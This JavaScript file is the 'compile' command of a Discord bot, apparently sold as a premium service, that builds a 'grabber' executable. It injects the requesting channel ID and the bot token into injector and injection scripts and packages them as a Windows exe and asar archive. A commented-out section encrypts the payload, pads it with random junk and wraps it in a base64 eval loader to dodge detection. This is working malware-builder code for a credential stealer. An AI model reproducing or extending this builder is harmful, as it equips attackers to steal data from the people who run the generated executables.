const pkg = require("pkg-api");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const asar = require("asar");
const config = require("../config.json");

module.exports = {
  name: "compile",
  description: "Compile exe file",
  premium: true,
  async execute(message, args, client) {
    const msg = await message.channel.send({
      content: "Compiling grabber...",
    });

    const genSecretKey = () => {
      var result = "";
      const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

      for (let i = 0; i < 32; i++) {
        result += characters.charAt(
          Math.floor(Math.random() * characters.length)
        );
      }

      return result;
    };

    const secret_key = genSecretKey();
    const iv = crypto.randomBytes(16);

    const encrypt = (data) => {
      const cipher = crypto.createCipheriv("aes-256-ctr", secret_key, iv);

      const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);

      return encrypted.toString("hex");
    };

    const craftCoolAss = () => {
      var result = "";
      const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!|@#·~%€¬&/()=^`[]+*¨´{}ç-,.";

      for (let i = 0; i < 250; i++) {
        result += characters.charAt(
          Math.floor(Math.random() * characters.length)
        );
        result += crypto.randomBytes(250).toString("hex");
      }

      return result;
    };

    const injectorData = await fs
      .readFileSync("./src/delta/injector.js")
      .toString("utf8");
    const injectionData = await fs
      .readFileSync("./src/delta/injection.js")
      .toString("utf8");

    /*
    var payload = `
    const crypto = require("crypto");

    const decrypt = (hash) => {
      const decipher = crypto.createDecipheriv("aes-256-crt", "${secret_key}", Buffer.from('${iv.toString(
      "hex"
    )}', 'hex'));
      const decrypted = Buffer.concat([decipher.update(Buffer.from(hash, 'hex')), decipher.final()]);
    };

    decrypt('${encrypt(
      injectorData
        .replace("<channel_id>", message.channel.id)
        .replace("<comment>", craftCoolAss())
    )}');
    `;

    await fs.writeFileSync(
      path.join(__dirname, `../delta/dist/${message.channel.id}.txt`),
      payload,
      {
        encoding: "utf8",
        flags: "w",
      }
    );

    payload = await fs.readFileSync(
      path.join(__dirname, `../delta/dist/${message.channel.id}.txt`)
    );

    payload = new Buffer(payload).toString("base64");
    payload = `const crypto = require("crypto");
      eval(new Buffer('${payload}', "base64").toString('utf8'))
    `;

    */

    await fs.writeFileSync(
      path.join(__dirname, "../delta/injector.js"),
      injectorData
        .replace("<channel_id>", message.channel.id)
        .replace("<bot_token>", client.token),
      {
        ecoding: "utf8",
        flags: "w",
      }
    );

    await fs.writeFileSync(
      path.join(__dirname, "../delta/core/app/delta/index.js"),
      injectionData
        .replace("<channel_id>", message.channel.id)
        .replace("<bot_token>", client.token),
      {
        ecoding: "utf8",
        flags: "w",
      }
    );

    await asar.createPackage(
      path.join(__dirname, `../delta/core`),
      path.join(__dirname, `../delta/dist/${message.channel.id}.asar`)
    );

    await pkg(path.join(__dirname, `../delta/injector.js`), {
      targets: "node12-win",
      output: path.join(__dirname, `../delta/dist/${message.channel.id}.exe`),
      compression: "Brotli",
    });

    await msg.edit({
      content: null,
      embeds: [
        {
          title: "EXE File Compiled!",
          description: `\`\`\`\n--- Encryption Information ---\n\nEncryption Method: AES\niv : ${iv.toString(
            "hex"
          )}\nSecret Key : ${secret_key}\`\`\`\n[Download EXE file](${
            config["www-url"]
          }download/${message.channel.id}?ext=exe)\n[Download ZIP file](${
            config["www-url"]
          }download/${message.channel.id}?ext=zip)`,
        },
      ],
    });

    await fs.writeFileSync(
      path.join(__dirname, "../delta/injector.js"),
      injectorData,
      {
        encoding: "utf8",
        flags: "w",
      }
    );

    await fs.writeFileSync(
      path.join(__dirname, "../delta/core/app/delta/index.js"),
      injectionData,
      {
        encoding: "utf8",
        flags: "w",
      }
    );
  },
};
